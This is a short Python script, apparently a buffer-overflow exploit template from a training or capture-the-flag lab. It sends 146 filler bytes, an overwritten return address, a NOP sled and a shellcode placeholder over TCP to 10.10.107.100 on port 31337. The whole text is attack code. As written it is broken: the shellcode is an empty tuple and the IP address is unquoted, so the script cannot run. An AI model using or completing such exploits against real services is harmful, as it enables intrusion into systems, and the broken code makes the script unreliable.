import socket

shellcode = ()

string = "A" * 146 + "\xc3\x14\x04\x08" + "\x90" * 16 + shellcode

print("Fuzzing ...")
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connect = s.connect((10.10.107.100, 31337))
s.send(string + '\r\n')
data = s.recv(1024)
s.close()